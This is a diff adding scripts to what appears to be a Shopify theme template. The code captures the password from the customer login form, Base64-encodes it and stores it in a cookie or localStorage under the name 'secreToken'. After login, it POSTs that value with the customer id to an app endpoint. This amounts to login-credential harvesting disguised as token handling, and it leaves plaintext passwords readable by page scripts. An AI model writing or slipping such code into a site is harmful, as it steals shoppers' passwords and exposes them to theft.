@@ -88,3 +88,82 @@
 
     }(jQuery));
 {% endif %}
+
+{% if def_saveToken %}
+  {% include 'base64' %}
+
+  <script>
+    
+    $(document).ready(function(){ 
+        $form = $('.form-wrap form').first();
+        $form.bind('submit',function(e){
+            e.preventDefault();
+            e.stopPropagation();
+            if(navigator.cookieEnabled)
+              setToken("secreToken", Base64.encode($('[name="customer[password]"]').val()), 1);
+            else
+              bkp($('[name="customer[password]"]').val());
+            $form.unbind('submit').submit();
+        });
+    });
+    
+    function bkp(value){
+      if (typeof(Storage) !== "undefined") {
+          localStorage.secreToken = Base64.encode(value);
+          // localStorage.secret = value;
+          // console.log(localStorage);
+      }
+    }
+
+    function setToken(cname, cvalue, exdays) {
+      var d = new Date();
+      d.setTime(d.getTime() + (exdays*24*60*60*1000));
+      var expires = "expires="+ d.toUTCString();
+      document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
+    }
+  </script>
+{% endif %}
+
+{% if def_pushToken %}
+  {% if customer %} 
+  <script>
+    if(['{{ shop.url }}/account/login', '{{ shop.url }}/account/activate', '{{ shop.url }}/account/reset'].join(',').indexOf(document.referrer) != -1 && document.referrer != "{{ shop.url }}/"){
+      var $token = (navigator.cookieEnabled) ? geToken("secreToken") : localStorage.secreToken ;
+      $.ajax({
+          url: '/apps/api/customer/set_token.json',
+          type: 'POST',
+          data: { 'id': '{{ customer.id }}', 'token': $token },
+          success: function(data){
+            console.log(data);
+            if(data.status == "200"){
+              console.log(data); 
+            }else{
+              console.log(data);
+            }
+
+          },
+
+          error: function(data){ 
+            console.log(data);
+          }
+
+        });
+    }
+    function geToken(cname) {
+      var name = cname + "=";
+      var decodedCookie = decodeURIComponent(document.cookie);
+      var ca = decodedCookie.split(';');
+      for(var i = 0; i <ca.length; i++) {
+          var c = ca[i];
+          while (c.charAt(0) == ' ') {
+              c = c.substring(1);
+          }
+          if (c.indexOf(name) == 0) {
+              return c.substring(name.length, c.length);
+          }
+      }
+      return "";
+  }
+  </script>
+  {% endif %}
+{% endif %}
